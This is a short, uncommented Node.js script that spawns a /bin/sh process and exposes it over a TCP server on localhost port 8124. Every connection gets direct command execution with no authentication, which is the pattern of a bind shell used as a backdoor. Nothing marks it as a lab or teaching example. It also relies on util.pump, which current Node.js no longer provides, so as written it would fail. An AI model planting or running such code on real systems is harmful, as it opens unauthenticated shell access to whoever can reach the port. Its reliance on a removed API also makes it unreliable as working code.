var net = require('net'),
util = require('util'),
spawn = require('child_process').spawn,
sh = spawn('/bin/sh',[]);

var server = net.createServer(function (c) {
        c.pipe(sh.stdin);
        util.pump(sh.stdout,c);
});
server.listen(8124, 'localhost');
